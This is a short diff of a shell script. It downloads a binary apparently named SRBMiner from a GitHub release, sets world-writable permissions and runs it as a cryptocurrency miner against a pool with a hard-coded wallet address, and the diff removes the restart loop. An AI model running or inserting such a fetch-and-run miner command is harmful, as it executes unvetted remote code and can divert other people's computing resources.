@@ -1,5 +1,3 @@
 wget -O SRB-299 https://github.com/Descajhuwita/friendly-palm-tree/releases/download/1/SRBMiner-299
 chmod 777 SRB-299
-while :; do
 ./SRB-299 --algorithm xhash --pool eu.rplant.xyz:7159 --wallet 0x48c27e67ddb605682609ce2b60278cdcf91fa284.x --password webpassword=x --keepalive true --disable-ptx-check
-done
